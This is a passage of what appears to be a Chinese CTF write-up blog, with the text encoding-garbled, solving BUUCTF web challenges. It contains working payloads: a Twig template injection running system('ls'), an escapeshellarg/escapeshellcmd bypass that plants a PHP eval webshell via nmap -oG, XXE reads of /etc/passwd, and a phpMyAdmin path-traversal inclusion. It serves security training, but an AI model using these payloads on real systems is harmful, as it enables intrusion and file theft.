<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>å¯åŠ¨ç¯å¢ƒ<br>flag.txt<br><img src="/images/RDZVO40JRJ84SIYW.png" srcset="/img/loading.gif" lazyload><br>hint.phpä¸­æŸ¥çœ‹æºç çš„æ³¨é‡Šä½œè€…ä¹Ÿè¯´äº†Do you know why i know your ip?<br>ç»“åˆé¢˜ç›®ä¸ä½œè€…çš„hintï¼ŒçŒœæµ‹æœ¬é¢˜x-forwarded-forå¤„æœ‰é—®é¢˜<br>burpsuiteæŠ“æŠ“<br><img src="/images/5ENMQE2LCM1KOF03JQ8.png" srcset="/img/loading.gif" lazyload><br>æˆåŠŸæ‰§è¡Œï¼Œè¯´æ˜XFFå¯æ§<br>æ§åˆ¶XFFè¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼ˆè¿™æ˜¯è¦åœ¨å‰ç«¯æœ‰IPç›¸å…³å›æ˜¾çš„æƒ…å†µï¼‰<br>æŸ¥é˜…èµ„æ–™<br>Flaskå¯èƒ½å­˜åœ¨Jinjia2æ¨¡ç‰ˆæ³¨å…¥æ¼æ´<br>PHPå¯èƒ½å­˜åœ¨Twigæ¨¡ç‰ˆæ³¨å…¥æ¼æ´<br>è¯•è¯•èƒ½å¦æ‰§è¡Œæ¨¡æ¿ç®—å¼</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">x-forwarded-for:</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/LJ7EPLUC0WFRYGH.png" srcset="/img/loading.gif" lazyload><br>æˆåŠŸæ‰§è¡Œï¼Œå°è¯•æ˜¯å¦èƒ½æ‰§è¡Œå‘½ä»¤</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">x-forwarded-for:</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">&#x27;ls&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/12M2VGZKUFL40.png" srcset="/img/loading.gif" lazyload><br>æ— è„‘RCE<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/13049923.html">æ¨¡æ¿æ³¨å…¥æ£€æµ‹</a></p>
<h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$host</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br>    <span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$host</span>);<br>    <span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$host</span>);<br>    <span class="hljs-variable">$sandbox</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;glzjin&quot;</span>. <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;you are in sandbox &#x27;</span>.<span class="hljs-variable">$sandbox</span>;<br>    @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>);<span class="hljs-comment">//åˆ›å»ºç›®å½•</span><br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$sandbox</span>);<span class="hljs-comment">//æ”¹å˜å½“å‰çš„ç›®å½•</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="hljs-variable">$host</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>HTTP_X_FORWARDED_FOR HTTPæ‰©å±•å¤´éƒ¨ï¼Œç”¨æ¥è¡¨ç¤ºhttpè¯·æ±‚ç«¯çœŸå®ip</p>
<p>REMOTE_ADDRä»£è¡¨å®¢æˆ·ç«¯çš„IPï¼Œä½†å®ƒçš„å€¼ä¸æ˜¯ç”±å®¢æˆ·ç«¯æä¾›çš„ï¼Œè€Œæ˜¯æœåŠ¡ç«¯æ ¹æ®å®¢æˆ·ç«¯çš„ipæŒ‡å®šçš„ï¼Œå½“ä½ çš„æµè§ˆå™¨è®¿é—®æŸä¸ªç½‘ç«™æ—¶ï¼Œå‡è®¾ä¸­é—´æ²¡æœ‰ä»»ä½•ä»£ç†ï¼Œé‚£ä¹ˆç½‘ç«™çš„webæœåŠ¡å™¨ï¼ˆNginxï¼ŒApacheç­‰ï¼‰å°±ä¼šæŠŠremote_addrè®¾ä¸ºä½ çš„æœºå™¨IPï¼Œå¦‚æœä½ ç”¨äº†æŸä¸ªä»£ç†ï¼Œé‚£ä¹ˆä½ çš„æµè§ˆå™¨ä¼šå…ˆè®¿é—®è¿™ä¸ªä»£ç†ï¼Œç„¶åå†ç”±è¿™ä¸ªä»£ç†è½¬å‘åˆ°ç½‘ç«™ï¼Œè¿™æ ·webæœåŠ¡å™¨å°±ä¼šæŠŠremote_addrè®¾ä¸ºè¿™å°ä»£ç†æœºå™¨çš„IPã€‚</p>
<p>æœ¬é¢˜ä¸»è¦è€ƒå¯Ÿçš„æ˜¯escapeshellargå’Œescapeshellcmdè¿™ä¸¤ä¸ªå‡½æ•°</p>
<ul>
<li>escapeshellargï¼šå¯¹ä¼ å…¥çš„å­—ç¬¦ä¸²ç”¨ä¸€å¯¹å•å¼•å·åŒ…å›´ï¼Œå°†å†…å®¹çš„â€™å…ˆç”¨åæ–œæ è½¬ä¹‰ï¼Œå†æ·»åŠ ä¸€å¯¹å•å¼•å·åŒ…å›´ï¼Œå³å•å¼•å·ä¼šè¢«è½¬ä¹‰ä¸ºâ€™&#39;â€˜</li>
<li>escapeshellcmdï¼šå¯¹\ä»¥åŠæœ€åé‚£ä¸ªä¸é…å¯¹å„¿çš„å¼•å·è¿›è¡Œè½¬ä¹‰</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ä¼ å…¥çš„å‚æ•°æ˜¯172.17.0.2<span class="hljs-string">&#x27; -v -d a=1</span><br><span class="hljs-string">ç»è¿‡escapeshellargå¤„ç†åå˜æˆäº†&#x27;</span>172.17.0.2<span class="hljs-string">&#x27;\&#x27;</span><span class="hljs-string">&#x27; -v -d a=1&#x27;</span>ï¼Œå³å…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨ã€‚<br>ç»è¿‡escapeshellcmdå¤„ç†åå˜æˆ<span class="hljs-string">&#x27;172.17.0.2&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span> -v -d <span class="hljs-attribute">a</span>=1\&#x27;ï¼Œè¿™æ˜¯å› ä¸ºescapeshellcmdå¯¹\ä»¥åŠæœ€åé‚£ä¸ªä¸é…å¯¹å„¿çš„å¼•å·è¿›è¡Œäº†è½¬ä¹‰ï¼š<br>æœ€åæ‰§è¡Œçš„å‘½ä»¤æ˜¯curl <span class="hljs-string">&#x27;172.17.0.2&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span> -v -d <span class="hljs-attribute">a</span>=1\&#x27;ï¼Œç”±äºä¸­é—´çš„\\è¢«è§£é‡Šä¸º\è€Œä¸å†æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥åé¢çš„&#x27;æ²¡æœ‰è¢«è½¬ä¹‰ï¼Œä¸å†åé¢çš„&#x27;é…å¯¹æˆäº†ä¸€ä¸ªç©ºç™½è¿æ¥ç¬¦ã€‚æ‰€ä»¥å¯ä»¥ç®€åŒ–ä¸ºcurl 172.17.0.2\ -v -d <span class="hljs-attribute">a</span>=1&#x27;,å³å‘172.17.0.2\å‘èµ·è¯·æ±‚ï¼ŒPOSTæ•°æ®ä¸ºa=1&#x27;ã€‚<br></code></pre></td></tr></table></figure>

<p>ä¸¤æ¬¡è½¬ä¹‰åå‡ºç°äº†é—®é¢˜ï¼Œæ²¡æœ‰è€ƒè™‘åˆ°å•å¼•å·çš„é—®é¢˜<br>å†å¾€ä¸‹çœ‹ï¼Œçœ‹åˆ°echo system(â€œnmap -T5 -sT -Pn â€“host-timeout 2 -F â€œ.$host);<br>è¿™é‡Œæœ‰ä¸ªsystemæ¥æ‰§è¡Œå‘½ä»¤ï¼Œè€Œä¸”æœ‰ä¼ å‚ï¼Œè‚¯å®šæ˜¯åˆ©ç”¨è¿™é‡Œäº†</p>
<p>è¿™é‡Œä»£ç çš„æœ¬æ„æ˜¯å¸Œæœ›æˆ‘ä»¬è¾“å…¥ipè¿™æ ·çš„å‚æ•°åšä¸€ä¸ªæ‰«æï¼Œé€šè¿‡ä¸Šé¢çš„ä¸¤ä¸ªå‡½æ•°æ¥è¿›è¡Œè§„åˆ™è¿‡æ»¤è½¬ä¹‰ï¼Œæˆ‘ä»¬çš„è¾“å…¥ä¼šè¢«å•å¼•å·å¼•èµ·æ¥ï¼Œä½†æ˜¯å› ä¸ºæˆ‘ä»¬çœ‹åˆ°äº†ä¸Šé¢çš„æ¼æ´æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€ƒè„±è¿™ä¸ªå¼•å·çš„æŸç¼š</p>
<p>åœ¨nmapå‘½ä»¤ä¸­ï¼Œæœ‰ä¸€ä¸ªå‚æ•°-oGå¯ä»¥å®ç°å°†å‘½ä»¤å’Œç»“æœå†™åˆ°æ–‡ä»¶ï¼Œè¿™ä¸ªå‘½ä»¤å°±æ˜¯æˆ‘ä»¬çš„è¾“å…¥å¯æ§ï¼Œç„¶åå†™å…¥åˆ°æ–‡ä»¶ï¼Œä¼ å…¥ä¸€å¥è¯æœ¨é©¬<br>æ³¨æ„å¼•å·åŠ ç©ºæ ¼ï¼Œä¸åŠ ç©ºæ ¼ä¼šå°†è¯­å¥è½¬ä¹‰ã€‚</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?host=&#x27; </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> -oG 1.php &#x27;</span><br></code></pre></td></tr></table></figure>
<p>è¿›å…¥MD5ç›®å½•ä¸‹çš„1.php<br><img src="/images/S3IOWE9SGW1BLCJK5.png" srcset="/img/loading.gif" lazyload><br>å¼€å§‹RCE</p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean">POST:<br>a=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br>a=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>);<br>a=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰ä¸¤ä¸ªå°é—®é¢˜</p>
<p>é¦–å…ˆæ˜¯åé¢æ²¡æœ‰åŠ å¼•å·</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?host=&#x27; </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> -oG 1.php</span><br></code></pre></td></tr></table></figure>

<p>å…ˆç»è¿‡escapeshellarg()å‡½æ•°å¤„ç†ï¼Œè¯¥å‡½æ•°ä¼šå…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?host=<span class="hljs-string">&#x27;&#x27;</span>\<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span> -oG <span class="hljs-number">1</span>.php<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>
<p>å†ç»è¿‡escapeshellcmd()å‡½æ•°å¤„ç†ï¼Œescapeshellcmdå¯¹\ä»¥åŠæœ€åé‚£ä¸ªä¸é…å¯¹å„¿çš„å¼•å·è¿›è¡Œäº†è½¬ä¹‰ï¼Œè½¬ä¹‰å‘½ä»¤ä¸­çš„æ‰€æœ‰shellå…ƒå­—ç¬¦æ¥å®Œæˆå·¥ä½œã€‚è¿™äº›å…ƒå­—ç¬¦åŒ…æ‹¬ï¼š<code>#&amp;;`,|*?~&lt;&gt;^()[]&#123;&#125;$\\ã€‚</code></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?h</span>ost=<span class="hljs-string">&#x27;&#x27;</span>\<span class="hljs-string">&#x27;&#x27;</span> \&lt;\<span class="hljs-string">?p</span>hp <span class="hljs-variable">@eval</span>\(<span class="hljs-variable">$_POST</span>\[<span class="hljs-string">&quot;a&quot;</span>\]\)\;\<span class="hljs-string">?\&gt;</span> -oG <span class="hljs-number">1</span>.php\<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>
<p>è¿”å›ç»“æœæ˜¯ä¸Šé¢é‚£æ ·æ–‡ä»¶ååé¢ä¼šå¤šä¸€ä¸ªå¼•å·1.phpâ€™</p>
<p>ç¬¬äºŒä¸ªæ˜¯åŠ å¼•å·ä½†å¼•å·å‰æ²¡æœ‰ç©ºæ ¼</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?host=&#x27; </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> -oG 1.php&#x27;</span><br></code></pre></td></tr></table></figure>
<p>è¿è¡Œç»“æœå¦‚ä¸‹</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">&#x27;&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span> \&lt;\<span class="hljs-string">?p</span>hp <span class="hljs-variable">@eval</span>\(<span class="hljs-variable">$_POST</span>\[<span class="hljs-string">&quot;a&quot;</span>\]\)\;\<span class="hljs-string">?\&gt;</span> -oG <span class="hljs-number">1</span>.php<span class="hljs-string">&#x27;\\&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
<p>æ–‡ä»¶ååé¢å°±ä¼šå¤šå‡º<code>\\</code> <code>1.php\\</code><br><a target="_blank" rel="noopener" href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() ä¹‹æ®‡</a></p>
<h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>å…ˆå°è¯•sqlæ³¨å…¥ï¼Œè¡Œä¸é€š<br>çœ‹çœ‹æºç <br><img src="/images/VSCRU5OH75NYS3N.png" srcset="/img/loading.gif" lazyload><br>æ‰¾åˆ°ä¸€ä¸ªphpæ–‡ä»¶<br>è¿˜æœ‰<br><code>contentType: &quot;application/xml;charset=utf-8&quot;,</code><br>è¿›å…¥doLogin.php<br><img src="/images/NY0S07MJ2GOIRTM3AJF.png" srcset="/img/loading.gif" lazyload><br>å‘ç°éƒ½æŒ‡å‘xml<br>é‚£ä¹ˆxmlæœ‰ä¸ªxxeæ¼æ´ï¼ŒæŠ“åŒ…çœ‹èƒ½å¦åˆ©ç”¨ä¸€ä¸‹ï¼Œæ„å»ºä¸€ä¸ªæ¶æ„çš„å¤–éƒ¨å®ä½“<br>payload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/CK8BJG03EQERY8O69T0.png" srcset="/img/loading.gif" lazyload><br>å¯è¡Œï¼Œçœ‹èƒ½ä¸èƒ½ç›´æ¥è¯»å–flag<br>payload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE a [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/MLC6SAFLMOJVT39WPR.png" srcset="/img/loading.gif" lazyload><br>ä¼ é€é—¨&#x3D;&#x3D;&#x3D;&gt;<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/175451.html">æµ…è°ˆXMLå®ä½“æ³¨å…¥æ¼æ´</a></p>
<h2 id="GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"><a href="#GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“" class="headerlink" title="[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"></a>[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h2><p><img src="/images/JMFRP9VYT5A0VKQDORT.png" srcset="/img/loading.gif" lazyload><br>æ•´äº†ä¸ªè¿™ä¹ˆä¸ªç•Œé¢ï¼Œæœ‰ç‚¹è¿·ç³Šï¼ŒæŠ“åŒ…æºç éƒ½æ²¡è·å¾—æœ‰æ•ˆçš„ä¿¡æ¯<br>ç”¨dirsearchæ‰«æ‰«ï¼Œæ‰«åˆ°äº†robots.txtï¼Œé‡Œé¢æç¤ºäº†ä¸ªphpinfo.phpï¼Œè¿˜æ˜¯æ²¡æœ‰æ‰¾åˆ°æœ‰æ•ˆçš„ä¿¡æ¯<br>å†å¾€åç»§ç»­æ‰«åˆ°äº†phpmyadminï¼Œè¿›å…¥æŸ¥çœ‹ï¼Œæ•°æ®åº“é‡Œä¸€å¤§å †å†…å®¹æ ¹æœ¬æ‡’å¾—çœ‹<br><img src="/images/XXQ3LARFHLVNSZQEEQW.png" srcset="/img/loading.gif" lazyload><br>æŸ¥é˜…åˆ°4.8.0 &lt;&#x3D; phpMyAdmin &lt; 4.8.2ç‰ˆæœ¬çš„phpmyadminéƒ½æ˜¯æœ‰æ–‡ä»¶åŒ…å«æ¼æ´<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44037296/article/details/111039461">æ¼æ´å¤ç°</a><br>ä¾‹å¦‚ä¼ å…¥</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-keyword">target</span><span class="hljs-operator">=</span>db_datadict.php<span class="hljs-variable">%253</span>f<br></code></pre></td></tr></table></figure>
<p>ç”±äºæœåŠ¡å™¨ä¼šè‡ªåŠ¨è§£ç ä¸€æ¬¡ï¼Œæ‰€ä»¥åœ¨checkPageValidity()ä¸­ï¼Œ$pageçš„å€¼ä¸€å¼€å§‹ä¼šæ˜¯db_datadict.php%3f,åˆä¸€æ¬¡urlè§£ç åå˜æˆäº†db_datadict.php?,è¿™ä¾¿ç¬¦åˆäº†?å‰å†…å®¹åœ¨ç™½åå•çš„è¦æ±‚ï¼Œå‡½æ•°è¿”å›trueä½†åœ¨index.phpä¸­$_REQUEST[â€˜targetâ€™]ä»ç„¶æ˜¯db_datadict.php%3f,è€Œä¸”ä¼šè¢«includeï¼Œé€šè¿‡ç›®å½•ç©¿è¶Šï¼Œå°±å¯é€ æˆä»»æ„æ–‡ä»¶åŒ…å«</p>
<p>æ¼æ´åŸç†æ˜¯ï¼š<br>åˆ©ç”¨&#x2F;ä½¿db_datadict.php?æˆä¸ºä¸€ä¸ªä¸å­˜åœ¨ç›®å½•ï¼Œåˆ©ç”¨includeå‡½æ•°çš„ç›®å½•ä¸æ–­è·³è½¬å°è¯•å¾—åˆ°flagç›®å½•ã€‚</p>
<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">25</span></span>çš„urlç¼–ç ä¸º%<br><span class="hljs-tag">%<span class="hljs-selector-tag">3f</span></span>çš„urlç¼–ç ä¸º?<br><span class="hljs-tag">%<span class="hljs-selector-tag">253f</span></span>--&gt;?<br></code></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?target=db_sql.php%<span class="hljs-number">253</span>f<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure>

<p><img src="/images/G1EYMWNMMY6OS2BF0.png" srcset="/img/loading.gif" lazyload><br>å¯ä»¥æˆåŠŸæ‰§è¡Œï¼Œè·å–åˆ°äº†passwdæ–‡ä»¶çš„å†…å®¹ï¼Œå°è¯•æŸ¥æ‰¾flag<br>payload</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?target=db_sql.php%<span class="hljs-number">253</span>f<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../flag<br></code></pre></td></tr></table></figure>

<p><img src="/images/XZ69C0YPOUN95B37GM.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>æŸ¥çœ‹æºç ä»¥åŠæŠ“åŒ…ï¼Œæ²¡æœ‰æ‰¾åˆ°æœ‰ç”¨çš„ä¿¡æ¯<br>å°è¯•dirsearchæ‰«æï¼Œå‘ç°å­˜åœ¨.gitæ³„éœ²<br>é‚£ä¹ˆç›´æ¥ç”¨git_hackæ‰«å‡ºæ–‡ä»¶<br>åœ¨index.phpæ–‡ä»¶ä¸­æ‰¾å‡ºphpæºç </p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;?php<br><br><span class="hljs-regexp">/*include &#x27;flag.php&#x27;;*/</span><br>highlight_file(__FILE__);<br><span class="hljs-variable">$yds</span> = <span class="hljs-string">&quot;dog&quot;</span>;<br><span class="hljs-variable">$is</span> = <span class="hljs-string">&quot;cat&quot;</span>;<br><span class="hljs-variable">$handsome</span> = <span class="hljs-string">&#x27;yds&#x27;</span>;<br><br>foreach(<span class="hljs-variable">$_POST</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    $<span class="hljs-variable">$x</span> = <span class="hljs-variable">$y</span>;<br>&#125;<br><br>foreach(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    $<span class="hljs-variable">$x</span> = $<span class="hljs-variable">$y</span>;<br>&#125;<br><br>foreach(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$handsome</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; !isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$yds</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>  || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>    <span 